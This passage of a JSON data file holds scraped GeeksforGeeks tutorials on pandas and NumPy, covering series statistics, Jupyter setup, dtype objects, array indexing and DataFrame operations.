112]},\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0columns = ['Geeks', 'For', 'geeks'])\u00a0\u00a0\u00a0# Apply groupby and aggregate function# max to find max value of column\u00a0\u00a0\u00a0# &quot;For&quot; and column &quot;geeks&quot; for every# different value of column &quot;Geeks&quot;.\u00a0\u00a0print(dframe.groupby(['Geeks']).max())Output :\r\n\r\nMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "c205bd420ff9e9bf48fed82fb3e35809",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python is a great language for doing data analysis, primarily because of the fantastic ecosystem of data-centric Python packages. Pandas is one of those packages and makes importing and analyzing data much easier.There are some important math operations that can be performed on a pandas series to simplify data analysis using Python and save a lot of time.To get the data-set used, click here.\u00a0s=read_csv(\"stock.csv\", squeeze=True)\n#reading csv file and making seriesFunctionUses.sum()Returns sum of all values in the seriess.mean()Returns mean of all values in series. Equals to s.sum()/s.count()\u00a0\u00a0\u00a0s.std()Returns standard deviation of all valuess.min() or s.max()Return min and max values from seriess.idxmin() or s.idxmax()Returns index of min or max value in seriess.median()Returns median of all values.mode()Returns mode of the seriess.value_counts()Returns series with frequency of each value\u00a0\u00a0\u00a0s.describe()Returns a series with information like mean, mode, etc depending on dtype of data passed\u00a0\u00a0\u00a0Code #1:\u00a0Python3# import pandas for reading csv fileimport pandas as pd\u00a0#reading csv files = pd.read_csv(\"stock.csv\", squeeze = True)\u00a0#using count functionprint(s.count())\u00a0#using sum functionprint(s.sum())\u00a0#using mean functionprint(s.mean())\u00a0#calculation averageprint(s.sum()/s.count())\u00a0#using std functionprint(s.std())\u00a0#using min functionprint(s.min())\u00a0#using max functionprint(s.max())\u00a0#using count functionprint(s.median())\u00a0#using mode functionprint(s.mode())Output:\u00a0\u00a03012\n1006942.0\n334.3100929614874\n334.3100929614874\n173.18720477113115\n49.95\n782.22\n283.315\n0    291.21Code #2:\u00a0Python3# import pandas for reading csv fileimport pandas as pd\u00a0#reading csv files = pd.read_csv(\"stock.csv\", squeeze = True)\u00a0#using describe functionprint(s.describe())\u00a0#using count functionprint(s.idxmax())\u00a0#using idxmin functionprint(s.idxmin())\u00a0#count of elements having value 3print(s.value_counts().head(3))Output:\u00a0dtype: float64\ncount    3012.000000\nmean      334.310093\nstd       173.187205\nmin        49.950000\n25%       218.045000\n50%       283.315000\n75%       443.000000\nmax       782.220000\nName: Stock Price, dtype: float64\n\n3011\n11\n291.21    5\n288.47    3\n194.80    3\nName: Stock Price, dtype: int64Unexpected Outputs and Restrictions:.sum(), .mean(), .mode(), .median() and other such mathematical operations are not applicable on string or any other data type than numeric value..sum() on a string series would give an unexpected output and return a string by concatenating every string.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "7513717bf3dd413b7318e73c90e9c1b6",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "The Jupyter Notebook is an open-source web application that allows you to create and share documents that contain live code, equations, visualizations and narrative text. Uses include data cleaning and transformation, numerical simulation, statistical modeling, data visualization, machine learning, and much more.Jupyter has support for over 40 different programming languages and Python is one of them. Python is a requirement (Python 3.3 or greater, or Python 2.7) for installing the Jupyter Notebook itself.Install Jupyter using Anaconda:Install Python and Jupyter using the Anaconda Distribution, which includes Python, the Jupyter Notebook, and other commonly used packages for scientific computing and data science. You can download Anaconda\u2019s latest Python3 version from here.Now, install the downloaded version of Anaconda.Installing Jupyter Notebook using PIP:python3 -m pip install --upgrade pip\r\npython3 -m pip install jupyterCommand to run the Jupyter notebook:jupyter notebookThis will print some information about the notebook server in your terminal, including the URL of the web application (by default, http://localhost:8888) and then open your default web browser to this URL.When the notebook opens in your browser, you will see the Notebook Dashboard, which will show a list of the notebooks, files, and subdirectories in the directory where the notebook server was started. Most of the time, you will wish to start a notebook server in the highest level directory containing notebooks. Often this will be your home directory.Create a new Notebook:Now on the dashboard, you can see a new button at the top right corner. Click it to open a drop-down list and then if you\u2019ll click on Python3, it will open a new notebook.Few Useful Commands:Command to open a notebook in the currently running notebook server.jupyter notebook notebook_name.ipynbBy default, the notebook server starts on port 8888. If port 8888 is unavailable or in use, the notebook server searches the next available port. You may also specify a port manually. In this example, we set the server\u2019s port to 9999:jupyter notebook --port 9999Command to start the notebook server without opening a web browser:jupyter notebook --no-browserThe notebook server provides help messages for other command line arguments using the \u2013help flag:jupyter notebook --help\u00a0Running your First code in Jupyter:Step #1: After successfully installing Jupyter write \u2018jupyter notebook\u2019 in the terminal/command prompt. This will open a new notebook server on your web browser.Step #2: On the top left corner, click on the new button and select python3. This will open a new notebook tab in your browser where you can start to write your first code.Step #3: Press Enter or click on the first cell in your notebook to go into the edit mode.Step #4: Now you are free to write any code.Step #5: You can run your code by pressing Shift + Enter or the run button provided at the top. An example code is given below:Some useful keyboard shortcuts:To change modes(edit, command):Esc - Change mode to command mode\r\nEnter - Change mode to edit modeTo change content type(code or markdown) [in command mode]m - Change to markdown\r\ny - Change to codeTo execute code or markdown [any mode]Shift + Enter - Execute and go to next cell\r\nCtrl + Enter  - Execute and be in the same cellTo insert cell [in command mode]a - Create cell in above to the cell\r\nb - Create cell in below to the cellTo cut copy paste [in command mode]x - Cut the cell that can be paste anywhere any number of times\r\nc - Copy the cell that can be paste anywhere and any number of times\r\nv - Paste the cellMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "8bfdc1c4a602f17686e1a09e92015944",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Every ndarray has an associated data type (dtype) object. This data type object (dtype) informs us about the layout of the array. This means it gives us information about:\u00a0Type of the data (integer, float, Python object, etc.)Size of the data (number of bytes)The byte order of the data (little-endian or big-endian)If the data type is a sub-array, what is its shape and data type?The values of a ndarray are stored in a buffer which can be thought of as a contiguous block of memory bytes. So how these bytes will be interpreted is given by the dtype object. \u00a01. Constructing a data type (dtype) object: A data type object is an instance of the NumPy.dtype class and it can be created using NumPy.dtype.Parameters:\u00a0obj: Object to be converted to a data-type object.align: bool, optional\u00a0Add padding to the fields to match what a C compiler would output for a similar C-struct.copy: bool, optional\u00a0Make a new copy of the data-type object. If False, the result may just be a reference to a built-in data-type object.Python# Python Program to create a data type objectimport numpy as np\u00a0# np.int16 is converted into a data type object.print(np.dtype(np.int16))Output:int16Python# Python Program to create a data type object# containing a 32 bit big-endian integerimport numpy as np\u00a0# i4 represents integer of size 4 byte# > represents big-endian byte ordering and < represents little-endian encoding.# dt is a dtype objectdt = np.dtype('>i4')\u00a0print(\"Byte order is:\",dt.byteorder)\u00a0print(\"Size is:\",dt.itemsize)\u00a0print(\"Data type is:\",dt.name)Output:Byte order is: >\nSize is: 4\nName of data type is: int32The type specifier (i4 in the above case) can take different forms:b1, i1, i2, i4, i8, u1, u2, u4, u8, f2, f4, f8, c8, c16, a\u00a0\u00a0 \u00a0(representing bytes, ints, unsigned ints, floats, complex and\u00a0\u00a0 \u00a0 fixed-length strings of specified byte lengths)int8,\u2026,uint8,\u2026,float16, float32, float64, complex64, complex128\u00a0\u00a0 \u00a0(this time with bit sizes)Note:dtype is different from type.\u00a0Python# Python program to differentiate# between type and dtype.import numpy as np\u00a0a = np.array([1])\u00a0print(\"type is: \",type(a))print(\"dtype is: \",a.dtype)Output:type is: \u00a0 \u00a0\ndtype is: \u00a0int322. Data type Objects with Structured Arrays: Data type objects are useful for creating structured arrays.\u00a0 A structured array is one that contains different types of data. Structured arrays can be accessed with the help of fields.\u00a0A field is like specifying a name to the object. In the case of structured arrays, the dtype object will also be structured.\u00a0\u00a0Python# Python program for demonstrating# the use of fieldsimport numpy as np\u00a0# A structured data type containing a 16-character string (in field \u2018name\u2019)\u00a0# and a sub-array of two 64-bit floating-point number (in field \u2018grades\u2019):\u00a0dt = np.dtype([('name', np.unicode_, 16), ('grades', np.float64, (2,))])\u00a0# Data type of object with field gradesprint(dt['grades'])\u00a0# Data type of object with field name\u00a0print(dt['name'])Output:\u00a0('<f8', (2,))Python# Python program to demonstrate\u00a0# the use of data type object with structured array.import numpy as np\u00a0dt = np.dtype([('name', np.unicode_, 16), ('grades', np.float64, (2,))])\u00a0# x is a structured array with names and marks of students.# Data type of name of the student is np.unicode_ and\u00a0# data type of marks is np.float(64)x = np.array([('Sarah', (8.0, 7.0)), ('John', (6.0, 7.0))], dtype=dt)\u00a0print(x[1])print(\"Grades of John are: \",x[1]['grades'])print(\"Names are: \",x['name'])Output:('John', [ 6., \u00a07.])\nGrades of John are: \u00a0[ 6. \u00a07.]\nNames are: \u00a0['Sarah' 'John']References :\u00a0\u00a0docs.scipy.orgStructured ArraysThis article is contributed by Ayushi Asthana. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "4d7bc315b6acb3c76d5386da0927d954",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Prerequisites : Numpy in Python IntroductionNumPy or Numeric Python is a package for computation on homogeneous n-dimensional arrays. In numpy dimensions are called as axes.Why do we need NumPy ?A question arises that why do we need NumPy when python lists are already there. The answer to it is we cannot perform operations on all the elements of two list directly. For example we cannot multiply two lists directly we will have to do it element wise. This is where the role of NumPy comes into play.Python# Python program to demonstrate a need of NumPy\u00a0list1 = [1, 2, 3, 4 ,5, 6]list2 = [10, 9, 8, 7, 6, 5]\u00a0# Multiplying both lists directly would give an error.print(list1*list2)Output :\u00a0TypeError: can't multiply sequence by non-int of type 'list'Where as this can easily be done with NumPy arrays.Another example,Python# Python program to demonstrate the use of NumPy arraysimport numpy as np\u00a0list1 = [1, 2, 3, 4, 5, 6]list2 = [10, 9, 8, 7, 6, 5]\u00a0# Convert list1 into a NumPy arraya1 = np.array(list1)\u00a0# Convert list2 into a NumPy arraya2 = np.array(list2)\u00a0print(a1*a2)Output :\u00a0array([10, 18, 24, 28, 30, 30])This article will help you get acquainted with indexing in NumPy in detail. Numpy package of python has a great power of indexing in different ways.\u00a0Indexing using index arraysIndexing can be done in numpy by using an array as an index. In case of slice, a view or shallow copy of the array is returned but in index array a copy of the original array is returned. Numpy arrays can be indexed with other arrays or any other sequence with the exception of tuples. The last element is indexed by -1 second last by -2 and so on.Python# Python program to demonstrate# the use of index arrays.import numpy as np\u00a0# Create a sequence of integers from 10 to 1 with a step of -2a = np.arrange(10, 1, -2)print(\"\\n A sequential array with a negative step: \\n\",a)\u00a0# Indexes are specified inside the np.array method.newarr = a[np.array([3, 1, 2 ])]print(\"\\n Elements at these indices are:\\n\",newarr)Output :\u00a0A sequential array with a negative step:\n[10  8  6  4  2]\n\nElements at these indices are:\n[4 8 6]Another example,Pythonimport numpy as np\u00a0# NumPy array with elements from 1 to 9x = np.array([1, 2, 3, 4, 5, 6, 7, 8, 9])\u00a0# Index values can be negative.arr = x[np.array([1, 3, -3])]print(\"\\n Elements are : \\n\",arr)Output :\u00a0Elements are:\n[2 4 7]Types of IndexingThere are two types of indexing :1. Basic Slicing and indexing : Consider the syntax x[obj] where x is the array and obj is the index. Slice object is the index in case of basic slicing. Basic slicing occurs when obj is :a slice object that is of the form start : stop : stepan integeror a tuple of slice objects and integersAll arrays generated by basic slicing are always view of the original array.Python# Python program for basic slicing.import numpy as np\u00a0# Arrange elements from 0 to 19a = np.arrange(20)print(\"\\n Array is:\\n \",a)\u00a0# a[start:stop:step]print(\"\\n a[-8:17:1] = \",a[-8:17:1])\u00a0# The : operator means all elements till the end.print(\"\\n a[10:] = \",a[10:])Output :Array is:\n[ 0  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19]\n\na[-8:17:1]  =  [12 13 14 15 16]\n\na[10:] = [10 11 12 13 14 15 16 17 18 19] Ellipsis can also be used along with basic slicing. Ellipsis (\u2026) is the number of : objects needed to make a selection tuple of the same length as the dimensions of the array.Python# Python program for indexing using basic slicing with ellipsisimport numpy as np\u00a0# A 3 dimensional array.b = np.array([[[1, 2, 3],[4, 5, 6]],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[[7, 8, 9],[10, 11, 12]]])\u00a0print(b[...,1]) #Equivalent to b[: ,: ,1 ]Output :[[ 2  5]\n [ 8 11]]2. Advanced indexing : Advanced indexing is triggered when obj is :\u00a0an ndarray of type integer or Booleanor a tuple with at least one sequence objectis a non tuple sequence objectAdvanced indexing returns a copy of data rather than a view of it. Advanced indexing is of two types integer and Boolean.Purely integer indexing : When integers are used for indexing. Each element of first dimension is paired with the element of the second dimension. So the index of the elements in this case are (0,0),(1,0),(2,1) and the corresponding elements are selected.Python# Python program showing advanced indexingimport numpy as np\u00a0a = np.array([[1 ,2 ],[3 ,4 ],[5 ,6 ]])print(a[[0 ,1 ,2 ],[0 ,0 ,1]])Output :\u00a0[1 3 6]Boolean Indexing\u00a0This indexing has some boolean expression as the index. Those elements are returned which satisfy that Boolean expression. It is used for filtering the desired element values.Python# You may wish to select numbers greater than 50import numpy as np\u00a0a = np.array([10, 40, 80, 50, 100])print(a[a>50])Output :\u00a0[80 100]Python# You may wish to square the multiples of 40import numpy as np\u00a0a = np.array([10, 40, 80, 50, 100])print(a[a%40==0]**2)Output :\u00a0[1600 6400])Python# You may wish to select those elements whose# sum of row is a multiple of 10.import numpy as np\u00a0b = np.array([[5, 5],[4, 5],[16, 4]])sumrow = b.sum(-1)print(b[sumrow%10==0])Output :\u00a0array([[ 5, 5], [16, 4]])Reference :\u00a0SciPy.orgThis article is contributed by Ayushi Asthana. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "405fe595b08a1e8ddf677967391e4ef4",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Pandas is an open-source library that is built on top of NumPy library. It is a Python package that offers various data structures and operations for manipulating numerical data and time series. It is mainly popular for importing and analyzing data much easier. Pandas is fast and it has high-performance & productivity for users.This Pandas Tutorial will help learning Pandas from Basics to advance data analysis operations, including all necessary functions explained in detail.Table of ContentsIntroductionCreating ObjectsViewing DataSelectionManipulating DataGrouping DataMerging, Joining and ConcatenatingWorking with Date and TimeWorking With Text DataWorking with CSV and Excel filesOperationsVisualizationApplications and ProjectsMiscellaneousPandas Practice problems with solutions !Recent Articles on Python Pandas !IntroductionIntroduction to Pandas in PythonHow to Install Python Pandas on Windows and Linux?How To Use Jupyter Notebook \u2013 An Ultimate GuideCreating ObjectsPython | Pandas DataFrameCreating a Pandas DataFramePython | Pandas SeriesCreating a Pandas SeriesViewing DataView the top rows of the frameView the bottom rows of the frameView basic statistical detailsConvert the pandas DataFrame to numpy ArrayConvert the pandas Series to numpy ArrayConvert series or dataframe object to Numpy-array using .as_matrix().SelectionDealing with Rows and Columns in Pandas DataFrameHow to select multiple columns in a pandas dataframePython | Pandas Extracting rows using .loc[]Python | Extracting rows using Pandas .iloc[]Indexing and Selecting Data with PandasBoolean Indexing in PandasLabel and Integer based slicing technique using DataFrame.ix[ ]\ud83d\udc49\ud83c\udffd Recent Articles on Pandas-IndexingManipulating DataAdding new column to existing DataFrame in PandasPython | Delete rows/columns from DataFrameTruncate a DataFrame before and after some index valueTruncate a Series before and after some index valueIterating over rows and columns in Pandas DataFrameWorking with Missing Data in PandasSorts a data frame in Pandas | Set-1Sorts a data frame in Pandas | Set-2Grouping DataPandas GroupByGrouping Rows in pandasCombining multiple columns in Pandas groupby with dictionaryMerging, Joining and ConcatenatingPython | Pandas Merging, Joining, and ConcatenatingConcatenate StringsAppend rows to DataframeConcatenate two or more seriesAppend a single or a collection of indicesCombine two series into oneAdd a row at top in pandas DataFrameJoin all elements in list present in a seriesJoin two text columns into a single column in PandasWorking with Date and TimePython | Working with date and time using PandasTimestamp using PandasCurrent Time using PandasConvert timestamp to ISO FormatGet datetime object using PandasReplace the member values of the given TimestampConvert string Date time into Python Date time object using PandasGet a fixed frequency DatetimeIndex using PandasWorking With Text DataPython | Pandas Working With Text DataConvert String into lower, upper or camel caseReplace Text ValueReplace Text Value using series.replace()Removing WhitespacesMove dates forward a given number of valid dates using PandasWorking with CSV and Excel filesRead csv using pandasSaving a Pandas Dataframe as a CSVLoading Excel spreadsheet as pandas DataFrameCreating a dataframe using Excel filesWorking with Pandas and XlsxWriter | Set \u2013 1Working with Pandas and XlsxWriter | Set \u2013 2Working with Pandas and XlsxWriter | Set \u2013 3OperationsApply a function on the possible seriesApply function to every row in a Pandas DataFrameApply a function on each element of the seriesAggregation data across one or more columnMean of the values for the requested axisMean of the underlying data in the SeriesMean absolute deviation of the values for the requested axisMean absolute deviation of the values for the SeriesUnbiased standard error of the meanFind the Series containing counts of unique valuesFind the Series containing counts of unique values using Index.value_counts()VisualizationPandas Built-in Data VisualizationData analysis and Visualization with Python | Set 1Data analysis and Visualization with Python | Set 2Box plot visualization with Pandas and SeabornApplications and ProjectsHow to Do a vLookup in Python using pandasConvert CSV to HTML Table in PythonKDE Plot Visualization with Pandas and SeabornAnalyzing selling price of used cars using PythonAdd CSS to the Jupyter Notebook using PandasMiscellaneousMore Functions on Python-PandasMore articles on pandas-dataframeMore Functions on pandas-dataframeMore articles on pandas-seriesMore Functions on pandas-seriesMore Articles on pandas-general-functionsMore Functions on pandas-datetimeMore Functions on pandas-datetimeIndexMore Functions on pandas-timedeltaMore Functions on pandas-TimeDeltaIndexMore Functions on pandas-TimestmapMore Functions on pandas-series-datetimeMore Functions on pandas-multiindex\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "4322509d2ed395e25a1957ebbfd77e1b",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "In the real world, a Pandas DataFrame will be created by loading the datasets from existing storage, storage can be SQL Database, CSV file, and Excel file. Pandas DataFrame can be created from the lists, dictionary, and from a list of dictionary etc.\u00a0\u00a0A Dataframe is a two-dimensional data structure, i.e., data is aligned in a tabular fashion in rows and columns. In dataframe datasets arrange in rows and columns, we can store any number of datasets in a dataframe. We can perform many operations on these datasets like arithmetic operation, columns/rows selection, columns/rows addition etc.\u00a0\u00a0Pandas DataFrame can be created in multiple ways. Let\u2019s discuss different ways to create a DataFrame one by one.Creating an empty dataframe :\u00a0A basic DataFrame, which can be created is an Empty Dataframe. An Empty Dataframe is created just by calling a dataframe constructor.\u00a0\u00a0Python3# import pandas as pdimport pandas as pd\u00a0# Calling DataFrame constructordf = pd.DataFrame()\u00a0print(df)Output :\u00a0\u00a0Empty DataFrame\nColumns: []\nIndex: []\u00a0\u00a0Creating a dataframe using List:\u00a0DataFrame can be created using a single list or a list of lists.\u00a0\u00a0Python3# import pandas as pdimport pandas as pd\u00a0# list of stringslst = ['Geeks', 'For', 'Geeks', 'is',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'portal', 'for', 'Geeks']\u00a0# Calling DataFrame constructor on listdf = pd.DataFrame(lst)print(df)Output:\u00a0\u00a0\u00a0\u00a0Creating DataFrame from dict of ndarray/lists:\u00a0To create DataFrame from dict of narray/list, all the narray must be of same length. If index is passed then the length index should be equal to the length of arrays. If no index is passed, then by default, index will be range(n) where n is the array length.\u00a0\u00a0Python3# Python code demonstrate creating# DataFrame from dict narray / lists# By default addresses.\u00a0import pandas as pd\u00a0# initialise data of lists.data = {'Name':['Tom', 'nick', 'krish', 'jack'], 'Age':[20, 21, 19, 18]}\u00a0# Create DataFramedf = pd.DataFrame(data)\u00a0# Print the output.print(df)Output:\u00a0\u00a0\u00a0\u00a0Create pandas dataframe from lists using dictionary:\u00a0Creating pandas data-frame from lists using dictionary can be achieved in different ways. We can create pandas dataframe from lists using dictionary using pandas.DataFrame. With this method in Pandas we can transform a dictionary of list to a dataframe.\u00a0Python3# importing pandas as pdimport pandas as pd\u00a0# dictionary of listsdict = {'name':[\"aparna\", \"pankaj\", \"sudhir\", \"Geeku\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'degree': [\"MBA\", \"BCA\", \"M.Tech\", \"MBA\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'score':[90, 40, 80, 98]}\u00a0df = pd.DataFrame(dict)\u00a0print(df)Output:\u00a0\u00a0\u00a0Multiple ways of creating dataframe :\u00a0\u00a0Different ways to create Pandas DataframeCreate pandas dataframe from lists using zipCreate a Pandas DataFrame from List of DictsCreate a Pandas Dataframe from a dict of equal length listsCreating a dataframe using ListCreate pandas dataframe from lists using dictionary\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "2e699fdeb522cc910f5694c1207e006b",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "A Data frame is a two-dimensional data structure, i.e., data is aligned in a tabular fashion in rows and columns. We can perform basic operations on rows/columns like selecting, deleting, adding, and renaming. In this article, we are using nba.csv file.Dealing with ColumnsIn order to deal with columns, we perform basic operations on columns like selecting, deleting, adding and renaming.Column Selection:In Order to select a column in Pandas DataFrame, we can either access the columns by calling them by their columns name.# Import pandas packageimport pandas as pd\u00a0\u00a0# Define a dictionary containing employee datadata = {'Name':['Jai', 'Princi', 'Gaurav', 'Anuj'],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Age':[27, 24, 22, 32],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Address':['Delhi', 'Kanpur', 'Allahabad', 'Kannauj'],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Qualification':['Msc', 'MA', 'MCA', 'Phd']}\u00a0\u00a0# Convert the dictionary into DataFrame\u00a0df = pd.DataFrame(data)\u00a0\u00a0# select two columnsprint(df[['Name', 'Qualification']])Output:For more examples refer to How to select multiple columns in a pandas dataframe\u00a0Column Addition:In Order to add a column in Pandas DataFrame, we can declare a new list as a column and add to a existing Dataframe.# Import pandas package\u00a0import pandas as pd\u00a0\u00a0# Define a dictionary containing Students datadata = {'Name': ['Jai', 'Princi', 'Gaurav', 'Anuj'],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Height': [5.1, 6.2, 5.1, 5.2],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Qualification': ['Msc', 'MA', 'Msc', 'Msc']}\u00a0\u00a0# Convert the dictionary into DataFramedf = pd.DataFrame(data)\u00a0\u00a0# Declare a list that is to be converted into a columnaddress = ['Delhi', 'Bangalore', 'Chennai', 'Patna']\u00a0\u00a0# Using 'Address' as the column name# and equating it to the listdf['Address'] = address\u00a0\u00a0# Observe the resultprint(df)Output:For more examples refer to Adding new column to existing DataFrame in Pandas\u00a0Column Deletion:In Order to delete a column in Pandas DataFrame, we can use the drop() method. Columns is deleted by dropping columns with column names.# importing pandas moduleimport pandas as pd\u00a0\u00a0# making data frame from csv filedata = pd.read_csv(\"nba.csv\", index_col =\"Name\" )\u00a0\u00a0# dropping passed columnsdata.drop([\"Team\", \"Weight\"], axis = 1, inplace = True)\u00a0\u00a0# displayprint(data)Output:As shown in the output images, the new output doesn\u2019t have the passed columns. Those values were dropped since axis was set equal to 1 and the changes were made in the original data frame since inplace was True.Data Frame before Dropping Columns-Data Frame after Dropping Columns-For more examples refer to Delete columns from DataFrame using Pandas.drop()Dealing with Rows:In order to deal with rows, we can perform basic operations on rows like selecting, deleting, adding and renaming.Row Selection:Pandas provide a unique method to retrieve rows from a Data frame.DataFrame.loc[] method is used to retrieve rows from Pandas DataFrame. Rows can also be selected by passing integer location to an iloc[] function.# importing pandas packageimport pandas as pd\u00a0\u00a0# making data frame from csv filedata = pd.read_csv(\"nba.csv\", index_col =\"Name\")\u00a0\u00a0# retrieving row by loc methodfirst = data.loc[\"Avery Bradley\"]second = data.loc[\"R.J. Hunter\"]\u00a0\u00a0\u00a0\u00a0print(first, \"\\n\\n\\n\", second)Output:As shown in the output image, two series were returned since there was only one parameter both of the times.For more examples refer to Pandas Extracting rows using .loc[]\u00a0Row Addition:In Order to add a Row in Pandas DataFrame, we can concat the old dataframe with new one.# importing pandas module\u00a0import pandas as pd\u00a0\u00a0\u00a0\u00a0\u00a0# making data frame\u00a0df = pd.read_csv(\"nba.csv\", index_col =\"Name\")\u00a0\u00a0\u00a0df.head(10)\u00a0\u00a0new_row = pd.DataFrame({'Name':'Geeks', 'Team':'Boston', 'Number':3,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Position':'PG', 'Age':33, 'Height':'6-2',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Weight':189, 'College':'MIT', 'Salary':99999},\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0index =[0])# simply concatenate both dataframesdf = pd.concat([new_row, df]).reset_index(drop = True)df.head(5)Output:Data Frame before Adding Row-Data Frame after Adding Row-For more examples refer to Add a row at top in pandas DataFrame\u00a0Row Deletion:In Order to delete a row in Pandas DataFrame, we can use the drop() method. Rows is deleted by dropping Rows by index label.# importing pandas moduleimport pandas as pd\u00a0\u00a0# making data frame from csv filedata = pd.read_csv(\"nba.csv\", index_col =\"Name\" )\u00a0\u00a0# dropping passed valuesdata.drop([\"Avery Bradley\", \"John Holland\", \"R.J. Hunter\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"R.J. Hunter\"], inplace = True)\u00a0\u00a0# displaydataOutput:As shown in the output images, the new output doesn\u2019t have the passed values. Those values were dropped and the changes were made in the original data frame since inplace was True.Data Frame before Dropping values-Data Frame after Dropping values-For more examples refer to Delete rows from DataFrame using Pandas.drop()\u00a0Problem related to Columns:How to get column names in Pandas dataframeHow to rename columns in Pandas DataFrameHow to drop one or multiple columns in Pandas DataframeGet unique values from a column in Pandas DataFrameHow to lowercase column names in Pandas dataframeApply uppercase to a column in Pandas dataframeCapitalize first letter of a column in Pandas dataframeGet n-largest values from a particular column in Pandas DataFrameGet n-smallest values from a particular column in Pandas DataFrameConvert a column to row name/index in PandasProblem related to Rows:Apply function to every row in a Pandas DataFrameHow to get rows names in Pandas dataframeMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "65bcb9bd04ffd3b9a78d4282f754e8db",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
